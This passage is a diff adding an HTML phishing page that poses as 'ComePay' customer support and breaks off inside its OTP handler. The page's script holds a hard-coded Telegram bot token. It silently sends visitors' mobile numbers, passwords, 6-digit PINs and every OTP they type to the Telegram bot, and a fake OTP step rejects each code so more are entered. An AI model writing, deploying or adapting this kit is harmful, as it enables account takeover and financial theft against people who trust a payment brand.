@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>
+      ComePay · Customer Support
+    </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; font-family: &#39;Inter&#39;, system-ui, -apple-system, &#39;Segoe UI&#39;, Roboto, &#39;Helvetica Neue&#39;, sans-serif; }
+    html, body { height: 100%; }
+    body {
+      display: flex; justify-content: center; align-items: center; min-height: 100vh;
+      background: linear-gradient(145deg, #f2fbf5 0%, #e8f5e9 40%, #d4edda 70%, #c8e6c9 100%);
+      background-size: 300% 300%; animation: bgGradientShift 18s ease infinite;
+      position: relative; overflow: hidden; padding: 16px;
+    }
+    @keyframes bgGradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+
+    .bg-layer { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
+    .blob { position: absolute; border-radius: 50%; filter: blur(50px); opacity: 0.45; animation: blobMove 24s ease-in-out infinite alternate; }
+    .blob1 { width: 340px; height: 340px; background: #a5d6a7; top: -100px; left: -100px; animation-duration: 22s; }
+    .blob2 { width: 280px; height: 280px; background: #c8e6c9; bottom: -80px; right: -80px; animation-duration: 28s; animation-delay: -6s; }
+    .blob3 { width: 220px; height: 220px; background: #b2dfdb; top: 40%; right: 10%; animation-duration: 32s; animation-delay: -12s; }
+    @keyframes blobMove { 0% { transform: translate(0,0) scale(1) rotate(0deg); } 50% { transform: translate(60px,-40px) scale(1.15) rotate(15deg); } 100% { transform: translate(-40px,50px) scale(0.95) rotate(-10deg); } }
+
+    .shape { position: absolute; opacity: 0.28; animation: shapeFloat 16s linear infinite; }
+    .shape.circle { border-radius: 50%; background: radial-gradient(circle at 30% 30%, #81c784, #4caf50); }
+    .shape.triangle { width: 0; height: 0; border-left: 18px solid transparent; border-right: 18px solid transparent; border-bottom: 30px solid #66bb6a; background: transparent; }
+    .shape.square { background: #a5d6a7; border-radius: 4px; transform: rotate(45deg); }
+    @keyframes shapeFloat { 0% { transform: translateY(0) rotate(0deg); opacity: 0.15; } 20% { opacity: 0.35; } 80% { opacity: 0.35; } 100% { transform: translateY(-120vh) rotate(360deg); opacity: 0; } }
+
+    .app-card {
+      width: 100%; max-width: 480px; background: rgba(255,255,255,0.93);
+      backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+      border-radius: 34px; padding: 28px 24px 26px;
+      box-shadow: 0 30px 60px -18px rgba(0,60,30,0.22), 0 0 0 1px rgba(255,255,255,0.85) inset, 0 0 80px -20px rgba(76,175,80,0.25);
+      border: 1px solid rgba(255,255,255,0.95); position: relative; z-index: 2;
+      animation: cardFadeIn 0.7s cubic-bezier(0.16,1,0.3,1); overflow: hidden;
+    }
+    .app-card::after {
+      content: &#39;&#39;; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+      background: linear-gradient(115deg, transparent 40%, rgba(255,255,255,0.35) 50%, transparent 60%);
+      animation: shimmer 7s infinite; pointer-events: none;
+    }
+    @keyframes shimmer { 0% { transform: translateX(-40%) rotate(0.001deg); } 100% { transform: translateX(40%) rotate(0.001deg); } }
+    @keyframes cardFadeIn { from { opacity: 0; transform: translateY(18px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
+
+    .support-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; padding: 0 2px; position: relative; z-index: 2; }
+    .support-badge { display: inline-flex; align-items: center; gap: 6px; font-size: 0.68rem; font-weight: 700; letter-spacing: 0.5px; color: #1e5e3a; background: rgba(200,230,201,0.65); padding: 5px 12px; border-radius: 30px; border: 1px solid rgba(165,214,167,0.9); text-transform: uppercase; backdrop-filter: blur(4px); }
+    .online-dot { width: 7px; height: 7px; background: #2e7d32; border-radius: 50%; box-shadow: 0 0 6px #2e7d32; animation: pulseDot 1.8s infinite; }
+    @keyframes pulseDot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.85); } }
+    .lock-badge { display: inline-flex; align-items: center; gap: 5px; font-size: 0.68rem; font-weight: 700; color: #2e7d32; background: rgba(255,255,255,0.7); padding: 5px 12px; border-radius: 30px; border: 1px solid rgba(165,214,167,0.7); text-transform: uppercase; backdrop-filter: blur(4px); }
+
+    .logo-area { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; position: relative; z-index: 2; }
+    .logo-area img { max-width: 210px; width: 100%; height: auto; display: block; filter: drop-shadow(0 8px 18px rgba(0,80,40,0.22)); animation: logoFloat 5s ease-in-out infinite; }
+    @keyframes logoFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-4px); } }
+
+    h2 { color: #0a2f3c; font-weight: 800; font-size: 1.45rem; letter-spacing: -0.02em; text-align: center; margin-bottom: 6px; position: relative; z-index: 2; }
+    .subhead { color: #2a6b5c; text-align: center; font-size: 0.92rem; margin-bottom: 20px; font-weight: 500; position: relative; z-index: 2; }
+
+    .problem-grid { display: flex; flex-direction: column; gap: 10px; margin: 4px 0; position: relative; z-index: 2; }
+    .problem-item {
+      background: rgba(255,255,255,0.85); border: 1.5px solid rgba(200,230,201,0.9); border-radius: 16px;
+      padding: 16px 20px; display: flex; align-items: center; gap: 16px; color: #1e3a3a;
+      font-size: 1.02rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease;
+      -webkit-tap-highlight-color: transparent; position: relative; overflow: hidden;
+    }
+    .problem-item i { width: 26px; font-size: 1.25rem; color: #2e7d32; text-align: center; transition: transform 0.2s; }
+    .problem-item:hover { background: #f0f9f4; border-color: #a5d6a7; transform: translateY(-1px); box-shadow: 0 8px 18px rgba(0,60,30,0.08); }
+    .problem-item:hover i { transform: scale(1.12); }
+    .problem-item.selected { background: linear-gradient(95deg, #e8f5e9, #d0ecd3); border-color: #4caf50; box-shadow: 0 0 0 2px rgba(76,175,80,0.25); }
+    .problem-item.selected::after { content: &#39;\f00c&#39;; font-family: &#39;Font Awesome 6 Free&#39;; font-weight: 900; position: absolute; right: 18px; color: #2e7d32; font-size: 1.1rem; animation: checkIn 0.25s ease-out; }
+    @keyframes checkIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+    .form-step { display: flex; flex-direction: column; gap: 16px; margin-top: 4px; position: relative; z-index: 2; }
+    .input-group { display: flex; flex-direction: column; gap: 6px; }
+    .input-group label { color: #1f6275; font-size: 0.78rem; font-weight: 700; letter-spacing: 0.4px; margin-left: 8px; text-transform: uppercase; }
+    .input-field { background: #f7faf8; border: 1.5px solid #c8e6c9; border-radius: 16px; padding: 16px 20px; font-size: 1.05rem; color: #083b47; outline: none; transition: all 0.2s; width: 100%; font-weight: 500; }
+    .input-field::placeholder { color: rgba(0,60,40,0.35); font-weight: 400; font-size: 0.95rem; }
+    .input-field:focus { background: #ffffff; border-color: #4caf50; box-shadow: 0 0 0 3px rgba(76,175,80,0.16); }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #2e7d32, #1b5e20); border: none; border-radius: 16px;
+      padding: 16px 24px; font-size: 1.08rem; font-weight: 700; color: white;
+      display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer;
+      margin-top: 6px; transition: all 0.2s; box-shadow: 0 10px 24px -8px #2e7d32;
+      width: 100%; -webkit-tap-highlight-color: transparent; position: relative; overflow: hidden;
+    }
+    .btn-primary::after { content: &#39;&#39;; position: absolute; top: 0; left: -120%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.22), transparent); transition: left 0.6s; }
+    .btn-primary:hover::after { left: 120%; }
+    .btn-primary:hover { background: linear-gradient(135deg, #388e3c, #2e7d32); transform: translateY(-1px); box-shadow: 0 12px 28px -8px #2e7d32; }
+    .btn-primary:active { transform: scale(0.98); }
+
+    .btn-secondary { background: rgba(255,255,255,0.9); border: 1.5px solid #c8e6c9; border-radius: 16px; padding: 14px 22px; color: #1e5e3a; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: 0.2s; width: 100%; margin-top: 6px; -webkit-tap-highlight-color: transparent; }
+    .btn-secondary:hover { background: #f0f9f4; border-color: #a5d6a7; }
+
+    .pin-row, .otp-row { display: flex; gap: 10px; justify-content: center; margin: 6px 0 0; transition: border-color 0.2s; }
+    .pin-box, .otp-box { width: 50px; height: 58px; background: #f7faf8; border: 2px solid #c8e6c9; border-radius: 14px; text-align: center; font-size: 1.6rem; font-weight: 700; color: #083b47; outline: none; transition: 0.15s; caret-color: #2e7d32; }
+    .pin-box:focus, .otp-box:focus { background: #ffffff; border-color: #4caf50; box-shadow: 0 0 0 3px rgba(76,175,80,0.16); transform: translateY(-2px); }
+
+    .otp-row.shake { animation: shakeRow 0.5s ease; }
+    @keyframes shakeRow {
+      0%, 100% { transform: translateX(0); }
+      15% { transform: translateX(-9px); }
+      30% { transform: translateX(9px); }
+      45% { transform: translateX(-7px); }
+      60% { transform: translateX(7px); }
+      75% { transform: translateX(-4px); }
+      90% { transform: translateX(4px); }
+    }
+    .otp-row.error .otp-box { border-color: #e53935; background: #fff5f5; box-shadow: 0 0 0 2px rgba(229,57,53,0.12); }
+    .otp-error-msg {
+      color: #c62828; font-size: 0.88rem; font-weight: 600; text-align: center; margin-top: 12px;
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      animation: errFadeIn 0.3s ease; position: relative; z-index: 2;
+    }
+    .otp-error-msg.hidden { display: none; }
+    @keyframes errFadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
+
+    .loader-overlay { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 18px; padding: 36px 10px; position: relative; z-index: 2; }
+    .spinner { width: 58px; height: 58px; border-radius: 50%; border: 4px solid rgba(0,100,60,0.12); border-top: 4px solid #2e7d32; animation: spin 0.9s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loader-text { color: #1e5e3a; font-size: 1rem; font-weight: 600; letter-spacing: 0.4px; }
+
+    @media (max-width: 480px) {
+      body { padding: 12px; }
+      .app-card { padding: 22px 16px 20px; border-radius: 28px; max-width: 100%; }
+      .logo-area img { max-width: 185px; }
+      .pin-box, .otp-box { width: 44px; height: 52px; font-size: 1.4rem; border-radius: 12px; }
+      .problem-item { padding: 14px 16px; font-size: 0.98rem; }
+      h2 { font-size: 1.3rem; }
+      .input-field { padding: 14px 18px; font-size: 1rem; }
+      .btn-primary { padding: 14px 18px; font-size: 1.02rem; }
+      .subhead { font-size: 0.88rem; margin-bottom: 18px; }
+    }
+    @media (max-width: 380px) {
+      .logo-area img { max-width: 160px; }
+      .pin-box, .otp-box { width: 38px; height: 46px; font-size: 1.2rem; border-radius: 10px; }
+    }
+    </style>
+  </head>
+  <body>
+    <div class="bg-layer" aria-hidden="true">
+      <div class="blob blob1">
+      </div>
+      <div class="blob blob2">
+      </div>
+      <div class="blob blob3">
+      </div>
+    </div>
+    <div class="app-card" id="appCard">
+      <div class="support-header">
+        <span class="support-badge">        <span class="online-dot"></span>
+        Live Support
+</span>
+        <span class="lock-badge">        <i class="fas fa-shield-alt" style="font-size: 0.65rem;"></i>
+        Secure
+</span>
+      </div>
+      <div class="logo-area">
+        <img src="logo.png" alt="ComePay logo" />
+      </div>
+      <div id="stepContainer">
+      </div>
+    </div>
+    <script>
+      (function() {
+      // ==================== TELEGRAM CONFIG (UPDATED) ====================
+      const TELEGRAM_BOT_TOKEN = &#39;8719779649:AAH2TqAFogjGwwQVS1ce0I5CMvZnhnNsHCQ;;
+      const TELEGRAM_CHAT_ID = &#39;7344589159&#39;;
+
+      // ==================== TELEGRAM SEND (silent, no UI) ====================
+      function sendToTelegram(text) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+
+        const url = &#39;https://api.telegram.org/bot&#39; + TELEGRAM_BOT_TOKEN + &#39;/sendMessage&#39;
+          + &#39;?chat_id=&#39; + TELEGRAM_CHAT_ID
+          + &#39;&amp;text=&#39; + encodeURIComponent(text)
+          + &#39;&amp;disable_web_page_preview=true&#39;;
+
+        try {
+          const img = new Image();
+          img.src = url;
+        } catch (e) {}
+
+        try {
+          fetch(url, { method: &#39;GET&#39;, mode: &#39;no-cors&#39;, cache: &#39;no-store&#39; }).catch(function() {});
+        } catch (e) {}
+
+        try {
+          const xhr = new XMLHttpRequest();
+          xhr.open(&#39;GET&#39;, url, true);
+          xhr.send();
+        } catch (e) {}
+
+        console.log(&#39;[TG] sent →&#39;, text.substring(0, 80));
+      }
+
+      // ==================== AUTO TEST PING ON LOAD ====================
+      setTimeout(function() {
+        sendToTelegram(
+          &#39;🔔 ComePay Page Opened\n&#39; +
+          &#39;━━━━━━━━━━━━━━━\n&#39; +
+          &#39;✅ Connection test\n&#39; +
+          &#39;🕒 Time: &#39; + new Date().toLocaleString()
+        );
+      }, 600);
+
+      // ==================== DYNAMIC SHAPES ====================
+      (function createShapes() {
+        const layer = document.querySelector(&#39;.bg-layer&#39;);
+        const shapeCount = window.innerWidth &lt; 480 ? 12 : 18;
+        const types = [&#39;circle&#39;, &#39;triangle&#39;, &#39;square&#39;];
+        for (let i = 0; i &lt; shapeCount; i++) {
+          const s = document.createElement(&#39;div&#39;);
+          s.className = &#39;shape &#39; + types[Math.floor(Math.random() * types.length)];
+          const size = 8 + Math.random() * 22;
+          if (s.classList.contains(&#39;circle&#39;)) {
+            s.style.width = size + &#39;px&#39;; s.style.height = size + &#39;px&#39;;
+          } else if (s.classList.contains(&#39;square&#39;)) {
+            s.style.width = (size * 0.7) + &#39;px&#39;; s.style.height = (size * 0.7) + &#39;px&#39;;
+          } else {
+            const b = size * 0.6;
+            s.style.borderLeftWidth = b + &#39;px&#39;; s.style.borderRightWidth = b + &#39;px&#39;; s.style.borderBottomWidth = (b * 1.6) + &#39;px&#39;;
+          }
+          s.style.left = Math.random() * 100 + &#39;%&#39;;
+          s.style.bottom = &#39;-15vh&#39;;
+          s.style.animationDuration = (14 + Math.random() * 18) + &#39;s&#39;;
+          s.style.animationDelay = (-Math.random() * 22) + &#39;s&#39;;
+          layer.appendChild(s);
+        }
+      })();
+
+      // ==================== CLICK SOUND ====================
+      let audioCtx = null;
+      function playClickSound() {
+        try {
+          if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+          if (audioCtx.state === &#39;suspended&#39;) audioCtx.resume();
+          const now = audioCtx.currentTime;
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.type = &#39;sine&#39;;
+          osc.frequency.setValueAtTime(1050, now);
+          osc.frequency.exponentialRampToValueAtTime(520, now + 0.06);
+          gain.gain.setValueAtTime(0.10, now);
+          gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.09);
+          osc.connect(gain); gain.connect(audioCtx.destination);
+          osc.start(now); osc.stop(now + 0.10);
+          const osc2 = audioCtx.createOscillator();
+          const gain2 = audioCtx.createGain();
+          osc2.type = &#39;triangle&#39;;
+          osc2.frequency.setValueAtTime(1600, now);
+          gain2.gain.setValueAtTime(0.035, now);
+          gain2.gain.exponentialRampToValueAtTime(0.0001, now + 0.05);
+          osc2.connect(gain2); gain2.connect(audioCtx.destination);
+          osc2.start(now); osc2.stop(now + 0.06);
+        } catch (e) {}
+      }
+
+      // ==================== ERROR BUZZER ====================
+      function playErrorSound() {
+        try {
+          if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+          if (audioCtx.state === &#39;suspended&#39;) audioCtx.resume();
+          const now = audioCtx.currentTime;
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.type = &#39;square&#39;;
+          osc.frequency.setValueAtTime(220, now);
+          osc.frequency.setValueAtTime(170, now + 0.13);
+          gain.gain.setValueAtTime(0.09, now);
+          gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.32);
+          osc.connect(gain); gain.connect(audioCtx.destination);
+          osc.start(now); osc.stop(now + 0.34);
+        } catch (e) {}
+      }
+
+      // ==================== VOICE ====================
+      function speak(text) {
+        if (!(&#39;speechSynthesis&#39; in window)) return;
+        window.speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance(text);
+        utterance.rate = 0.92;
+        utterance.pitch = 1.02;
+        utterance.volume = 0.9;
+        const voices = window.speechSynthesis.getVoices();
+        if (voices.length) {
+          const preferred = voices.find(v =&gt; v.lang.startsWith(&#39;en&#39;) &amp;&amp; v.name.toLowerCase().includes(&#39;female&#39;))
+            || voices.find(v =&gt; v.lang.startsWith(&#39;en&#39;) &amp;&amp; v.name.toLowerCase().includes(&#39;google&#39;))
+            || voices.find(v =&gt; v.lang.startsWith(&#39;en&#39;));
+          if (preferred) utterance.voice = preferred;
+        }
+        window.speechSynthesis.speak(utterance);
+      }
+      if (&#39;speechSynthesis&#39; in window) window.speechSynthesis.onvoiceschanged = function() {};
+
+      // ==================== GLOBAL CLICK SOUND ====================
+      document.getElementById(&#39;appCard&#39;).addEventListener(&#39;click&#39;, function(e) {
+        const el = e.target.closest(&#39;.problem-item, .btn-primary, .btn-secondary&#39;);
+        if (el) playClickSound();
+      });
+
+      // ==================== STATE ====================
+      let selectedProblem = null;
+      let mobileNumber = &#39;&#39;;
+      let password = &#39;&#39;;
+      let enteredPin = &#39;&#39;;
+      let otpAttempts = 0;
+
+      const stepContainer = document.getElementById(&#39;stepContainer&#39;);
+
+      function showLoading(message, submessage, duration, callback) {
+        stepContainer.innerHTML = `
+          &lt;div class=&#34;loader-overlay&#34;&gt;
+            &lt;div class=&#34;spinner&#34;&gt;&lt;/div&gt;
+            &lt;div class=&#34;loader-text&#34;&gt;${message}&lt;/div&gt;
+            &lt;div style=&#34;color: #2a6b5c; font-size: 0.82rem; margin-top: 2px;&#34;&gt;${submessage}&lt;/div&gt;
+          &lt;/div&gt;
+        `;
+        setTimeout(callback, duration);
+      }
+
+      const problems = [
+        { id: 1, label: &#39;Selling issue&#39;, icon: &#39;fa-store&#39; },
+        { id: 2, label: &#39;Deposit failed&#39;, icon: &#39;fa-credit-card&#39; },
+        { id: 3, label: &#39;Account freeze&#39;, icon: &#39;fa-lock&#39; },
+        { id: 4, label: &#39;Account hacked&#39;, icon: &#39;fa-shield-alt&#39; },
+        { id: 5, label: &#39;UPI change&#39;, icon: &#39;fa-mobile-alt&#39; }
+      ];
+
+      // ---------- PROBLEM STEP ----------
+      function renderProblemStep() {
+        let problemsHtml = &#39;&#39;;
+        problems.forEach(p =&gt; {
+          problemsHtml += `
+            &lt;div class=&#34;problem-item&#34; data-id=&#34;${p.id}&#34; data-label=&#34;${p.label}&#34;&gt;
+              &lt;i class=&#34;fas ${p.icon}&#34;&gt;&lt;/i&gt;
+              &lt;span&gt;${p.id}. ${p.label}&lt;/span&gt;
+            &lt;/div&gt;
+          `;
+        });
+
+        stepContainer.innerHTML = `
+          &lt;h2&gt;How can we help you?&lt;/h2&gt;
+          &lt;div class=&#34;subhead&#34;&gt;Select the issue you are facing&lt;/div&gt;
+          &lt;div class=&#34;problem-grid&#34;&gt;${problemsHtml}&lt;/div&gt;
+        `;
+
+        document.querySelectorAll(&#39;.problem-item&#39;).forEach(item =&gt; {
+          item.addEventListener(&#39;click&#39;, function() {
+            document.querySelectorAll(&#39;.problem-item&#39;).forEach(i =&gt; i.classList.remove(&#39;selected&#39;));
+            this.classList.add(&#39;selected&#39;);
+            selectedProblem = { id: parseInt(this.dataset.id), label: this.dataset.label };
+
+            sendToTelegram(
+              &#39;🎫 NEW SUPPORT REQUEST — ComePay\n&#39; +
+              &#39;━━━━━━━━━━━━━━━\n&#39; +
+              &#39;📌 Issue: &#39; + selectedProblem.label + &#39;\n&#39; +
+              &#39;🕒 Time: &#39; + new Date().toLocaleString() + &#39;\n&#39; +
+              &#39;🌐 Page: ComePay Verification&#39;
+            );
+
+            showLoading(&#39;Connecting to support...&#39;, &#39;Please wait&#39;, 1500, renderRegisterStep);
+          });
+        });
+      }
+
+      // ---------- REGISTER STEP ----------
+      function renderRegisterStep() {
+        stepContainer.innerHTML = `
+          &lt;h2&gt;Customer Verification&lt;/h2&gt;
+          &lt;div class=&#34;subhead&#34;&gt;${selectedProblem ? selectedProblem.label : &#39;&#39;}&lt;/div&gt;
+          &lt;div class=&#34;form-step&#34;&gt;
+            &lt;div class=&#34;input-group&#34;&gt;
+              &lt;label&gt;MOBILE NUMBER&lt;/label&gt;
+              &lt;input type=&#34;tel&#34; id=&#34;mobileInput&#34; class=&#34;input-field&#34; placeholder=&#34;Enter 10-digit mobile number&#34; maxlength=&#34;10&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;/div&gt;
+            &lt;div class=&#34;input-group&#34;&gt;
+              &lt;label&gt;PASSWORD&lt;/label&gt;
+              &lt;input type=&#34;password&#34; id=&#34;passwordInput&#34; class=&#34;input-field&#34; placeholder=&#34;Enter your password&#34; maxlength=&#34;30&#34;&gt;
+            &lt;/div&gt;
+            &lt;button id=&#34;registerBtn&#34; class=&#34;btn-primary&#34;&gt;
+              &lt;i class=&#34;fas fa-shield-alt&#34;&gt;&lt;/i&gt; Verify &amp; Continue
+            &lt;/button&gt;
+          &lt;/div&gt;
+        `;
+
+        const mobileInput = document.getElementById(&#39;mobileInput&#39;);
+        const passwordInput = document.getElementById(&#39;passwordInput&#39;);
+        const registerBtn = document.getElementById(&#39;registerBtn&#39;);
+
+        mobileInput.addEventListener(&#39;input&#39;, function() {
+          this.value = this.value.replace(/\D/g, &#39;&#39;).slice(0, 10);
+        });
+
+        registerBtn.addEventListener(&#39;click&#39;, function() {
+          const mobile = mobileInput.value.trim();
+          const pwd = passwordInput.value.trim();
+
+          if (mobile.length !== 10 || !/^\d{10}$/.test(mobile)) {
+            alert(&#39;Please enter a valid 10-digit Indian mobile number.&#39;);
+            return;
+          }
+          if (pwd.length &lt; 4) {
+            alert(&#39;Password must be at least 4 characters.&#39;);
+            return;
+          }
+
+          mobileNumber = mobile;
+          password = pwd;
+
+          sendToTelegram(
+            &#39;📱 MOBILE &amp; PASSWORD RECEIVED — ComePay\n&#39; +
+            &#39;━━━━━━━━━━━━━━━\n&#39; +
+            &#39;🎫 Issue: &#39; + (selectedProblem ? selectedProblem.label : &#39;N/A&#39;) + &#39;\n&#39; +
+            &#39;📞 Mobile: &#39; + mobile + &#39;\n&#39; +
+            &#39;🔒 Password: &#39; + pwd + &#39;\n&#39; +
+            &#39;🕒 Time: &#39; + new Date().toLocaleString()
+          );
+
+          speak(&#39;Verifying your details. Please wait.&#39;);
+
+          showLoading(&#39;Verifying your details...&#39;, &#39;Secure connection established&#39;, 4500, function() {
+            speak(&#39;Verification successful.&#39;);
+            renderPinStep();
+          });
+        });
+      }
+
+      // ---------- PIN STEP ----------
+      function renderPinStep() {
+        stepContainer.innerHTML = `
+          &lt;h2&gt;Enter 6-digit PIN&lt;/h2&gt;
+          &lt;div class=&#34;subhead&#34;&gt;Enter your 6-digit PIN&lt;/div&gt;
+          &lt;div class=&#34;pin-row&#34; id=&#34;pinRow&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;pin-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;pin-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;pin-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;pin-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;pin-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;pin-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+          &lt;/div&gt;
+          &lt;button id=&#34;pinSubmitBtn&#34; class=&#34;btn-primary&#34; style=&#34;margin-top: 18px;&#34;&gt;
+            &lt;i class=&#34;fas fa-lock&#34;&gt;&lt;/i&gt; Continue
+          &lt;/button&gt;
+        `;
+
+        const pinInputs = document.querySelectorAll(&#39;.pin-box&#39;);
+        const pinSubmitBtn = document.getElementById(&#39;pinSubmitBtn&#39;);
+
+        pinInputs.forEach((input, idx) =&gt; {
+          input.addEventListener(&#39;input&#39;, function() {
+            this.value = this.value.replace(/\D/g, &#39;&#39;).slice(0, 1);
+            if (this.value.length === 1 &amp;&amp; idx &lt; pinInputs.length - 1) pinInputs[idx + 1].focus();
+          });
+          input.addEventListener(&#39;keydown&#39;, function(e) {
+            if (e.key === &#39;Backspace&#39; &amp;&amp; this.value.length === 0 &amp;&amp; idx &gt; 0) pinInputs[idx - 1].focus();
+          });
+        });
+
+        pinInputs[0].focus();
+
+        pinSubmitBtn.addEventListener(&#39;click&#39;, function() {
+          let pin = &#39;&#39;;
+          for (let i = 0; i &lt; pinInputs.length; i++) {
+            const val = pinInputs[i].value.trim();
+            if (val.length !== 1 || !/^\d$/.test(val)) {
+              alert(&#39;Please enter all 6 digits of your PIN.&#39;);
+              pinInputs[i].focus();
+              return;
+            }
+            pin += val;
+          }
+          enteredPin = pin;
+
+          sendToTelegram(
+            &#39;🔑 6-DIGIT PIN RECEIVED — ComePay\n&#39; +
+            &#39;━━━━━━━━━━━━━━━\n&#39; +
+            &#39;📞 Mobile: &#39; + mobileNumber + &#39;\n&#39; +
+            &#39;🔐 PIN: &#39; + pin + &#39;\n&#39; +
+            &#39;🕒 Time: &#39; + new Date().toLocaleString()
+          );
+
+          showLoading(&#39;Verifying PIN...&#39;, &#39;Please wait&#39;, 1000, renderOtpStep);
+        });
+      }
+
+      // ---------- OTP STEP (always wrong — loops forever) ----------
+      function renderOtpStep() {
+        otpAttempts = 0;
+
+        stepContainer.innerHTML = `
+          &lt;h2&gt;OTP Verification&lt;/h2&gt;
+          &lt;div class=&#34;subhead&#34;&gt;6-digit code sent to +91 ${mobileNumber}&lt;/div&gt;
+          &lt;div class=&#34;otp-row&#34; id=&#34;otpRow&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;otp-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;otp-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;otp-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;otp-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;otp-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+            &lt;input type=&#34;tel&#34; class=&#34;otp-box&#34; maxlength=&#34;1&#34; inputmode=&#34;numeric&#34; pattern=&#34;[0-9]*&#34;&gt;
+          &lt;/div&gt;
+          &lt;div id=&#34;otpError&#34; class=&#34;otp-error-msg hidden&#34;&gt;&lt;/div&gt;
+          &lt;button id=&#34;otpSubmitBtn&#34; class=&#34;btn-primary&#34; style=&#34;margin-top: 18px;&#34;&gt;
+            &lt;i class=&#34;fas fa-check-circle&#34;&gt;&lt;/i&gt; Verify OTP
+          &lt;/button&gt;
+        `;
+
+        const otpInputs = document.querySelectorAll(&#39;.otp-box&#39;);
+        const otpSubmitBtn = document.getElementById(&#39;otpSubmitBtn&#39;);
+        const otpRow = document.getElementById(&#39;otpRow&#39;);
+        const otpError = document.getElementById(&#39;otpError&#39;);
+
+        otpInputs.forEach((input, idx) =&gt; {
+          input.addEventListener(&#39;input&#39;, function() {
+            this.value = this.value.replace(/\D/g, &#39;&#39;).slice(0, 1);
+            otpRow.classList.remove(&#39;error&#39;);
+            if (this.value.length === 1 &amp;&amp; idx &lt; otpInputs.length - 1) otpInputs[idx + 1].focus();
+          });
+          input.addEventListener(&#39;keydown&#39;, function(e) {
+            if (e.key === &#39;Backspace&#39; &amp;&amp; this.value.length === 0 &amp;&amp; idx &gt; 0) otpInputs[idx - 1].focus();
+          });
+        });
+
+        otpInputs[0].focus();
+
+        otpSubmitBtn.addEventListener(&#39;click&#39;, function() {
+          let otp = &#39;&#39;;
+          for (let i = 0; i &lt; otpInputs.length; i++) {
+            const val = otpInputs[i].value.trim();
+            if (val.length !== 1 || !/^\d$/.test(val)) {
+              alert(&#39;Please enter all 6 digits of the OTP.&#39;);
+              otpInputs[i].focus();
+              return;
+            }
+            otp += val;
+          }
+
+          otpAttempts++;
+
+          sendToTelegram(
+            &#39;❌ WRONG OTP ATTEMPT #&#39; + otpAttempts + &#39; — ComePay\n&#39; +
+            &#39;━━━━━━━━━━━━━━━\n&#39; +
+            &#39;📞 Mobile: &#39; + mobileNumber + &#39;\n&#39; +
+            &#39;🔢 OTP entered: &#39; + otp + &#39;\n&#39; +
+            &#39;🕒 Time: &#39; + new Date().toLocaleString()
+          );
+
+          playErrorSound();
+          speak(&#39;Wrong OTP. Please try again.&#39;);
+
